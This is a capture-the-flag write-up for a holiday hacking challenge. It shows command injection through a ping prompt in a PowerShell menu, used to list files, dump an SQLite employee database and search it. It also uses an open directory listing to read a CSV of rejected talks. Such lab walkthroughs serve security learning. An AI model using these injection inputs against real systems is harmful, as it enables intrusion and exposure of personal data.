## Objective 2

> Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze [the CFP site](https://cfp.kringlecastle.com/) to find out. 
> For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.

### Challenge

> Find the first name of our guy "Chan!"
> -Bushy Evergreen

> To solve this challenge, determine the new worker's first name and submit to runtoanswer.

For this challenge you will need:

- Powershell command injection: https://ss64.com/ps/call.html
- SQLite dump: https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database

Let's access the terminal:
```
====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================




 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.


Please make a selection: 
```

The onboard process lets you register a person, but we don't care.
The system verification asks for the server address:

```
Validating data store for employee onboard information.
Enter address of server:
```

Trying with `localhost` yealds two important results:
```
Validating data store for employee onboard information.
Enter address of server: localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.039 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.074 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2048ms
rtt min/avg/max/mdev = 0.039/0.059/0.074/0.016 ms
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```
So:
- it seems that `localhost` is passed as a param to ping (possibile injection)
- we have a SQLite 3 database on `onboard.db`

Try to inject some commands, like `&"ls"`:
```
Validating data store for employee onboard information.
Enter address of server: &"ls"
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
menu.ps1  onboard.db  runtoanswer
onboard.db: SQLite 3.x database
```

Nice, command injection works and we found 3 files on the current directory:
- `menu.ps1`: the interface menu
- `onboard.db`: SQLite db
- `runtoanswer`: duh :-)


Let's dump the full database with `& "sqlite3" onboard.db .dump > db.dump`:
```
Validating data store for employee onboard information.
Enter address of server: & "sqlite3" onboard.db .dump > db.dump
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

Did it work? Check with `& "head" -n 20 db.dump`:

```
Validating data store for employee onboard information.
Enter address of server: & "head" -n 20 db.dump
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','077 8656 6609','karensduck@einrot.com');
INSERT INTO "onboard" VALUES(11,'Josephine','Harrell','3 Victoria Road',NULL,'LITTLE ASTON','B74 8XD','079 5532 7917','josephinedharrell@einrot.com');
INSERT INTO "onboard" VALUES(12,'Jason','Madsen','4931 Cliffside Drive',NULL,'Worcester','12197','607-397-0037','jasonlmadsen@einrot.com');
INSERT INTO "onboard" VALUES(13,'Nichole','Murphy','53 St. John Street',NULL,'Craik','S4P 3Y2','306-734-9091','nicholenmurphy@teleworm.us');
INSERT INTO "onboard" VALUES(14,'Mary','Lyons','569 York Mills Rd',NULL,'Toronto','M3B 1Y2','416-274-6639','maryjlyons@superrito.com');
INSERT INTO "onboard" VALUES(15,'Luz','West','1307 Poe Lane',NULL,'Paola','66071','913-557-2372','luzcwest@rhyta.com');
INSERT INTO "onboard" VALUES(16,'Walter','Savell','4782 Neville Street',NULL,'Seymour','47274','812-580-5138','walterdsavell@fleckens.hu');
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

Now that you have the db, extract the information with `& "grep" Chan db.dump`:
```
Validating data store for employee onboard information.
Enter address of server: & "grep" Chan db.dump
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

Got it! Pass it to `& "runtoanswer"`:
```
Validating data store for employee onboard information.
Enter address of server: & "runtoanswer"
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Loading, please wait......



Enter Mr. Chan's first name: Scott


                                                                                
    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                

Congratulations!
```

**Hint**: On a website, finding browsable directories is sometimes as simple as removing characters from the end of a URL.


### Objective completion

Access to https://cfp.kringlecastle.com/ and to https://cfp.kringlecastle.com/cfp/cfp.html to see that "The KringleCon CFP is officially closed"

To find browsable directories, try to remove the filename from the url and browse to https://cfp.kringlecastle.com/cfp/:

```
Index of /cfp/
../
cfp.html                                           08-Dec-2018 13:19                3391
rejected-talks.csv                                 08-Dec-2018 13:19               30677
```

Access https://cfp.kringlecastle.com/cfp/rejected-talks.csv and grep/search for "Data Loss for Rainbow Teams":

```
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11
```

**Objective answer**: `John McClane`

